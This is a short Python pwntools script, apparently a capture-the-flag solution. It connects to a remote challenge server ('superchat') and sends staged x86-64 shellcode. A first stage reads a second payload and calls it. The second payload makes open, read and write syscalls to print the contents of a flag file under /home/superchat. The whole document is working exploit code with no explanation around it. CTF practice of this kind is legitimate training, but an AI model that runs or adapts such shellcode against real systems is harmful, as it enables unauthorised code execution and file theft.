from pwn import *

r = remote('ctf.adl.tw', 10003)
# r = process('./superchat')

context.arch = 'amd64'

# sys_read()
shellcode1 = asm('''
    mov rdx, 0x100
    syscall
    call rsi
''')

# sys_open()
shellcode = asm('''
    nop
    nop
    mov rax, 0
    mov rax, 0x0000000067616c66
    push rax
    mov rax, 0x2f74616863726570
    push rax
    mov rax, 0x75732f656d6f682f
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall
''')

# sys_read()
shellcode += asm('''
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x100
    mov rax, 0
    syscall
''')

# sys_write()
shellcode += asm('''
    mov rdi, 2
    mov rsi, rsp
    mov rdx, 0x100
    mov rax, 1
    syscall
''')

r.send(shellcode1)

r.send(shellcode)

r.interactive()
